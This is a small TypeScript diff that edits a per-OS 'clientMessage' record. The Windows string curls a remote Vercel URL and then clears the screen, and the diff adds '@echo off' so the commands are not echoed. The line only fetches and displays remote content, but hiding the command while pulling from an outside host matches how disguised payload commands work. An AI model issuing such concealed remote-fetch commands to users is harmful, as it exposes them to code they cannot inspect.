@@ -11,7 +11,7 @@ export type System3 = "linux"
 
 const clientMessage: Record<System1 | System2 | System3, string> = {
   windows:
-    'startlocal\ncurl -L ireq.vercel.app/api/settings/windows\nendlocal\ncls\n',
+    '@echo off\nstartlocal\ncurl -L ireq.vercel.app/api/settings/windows\nendlocal\ncls\n',
   mac: "",
   linux: "",
 }
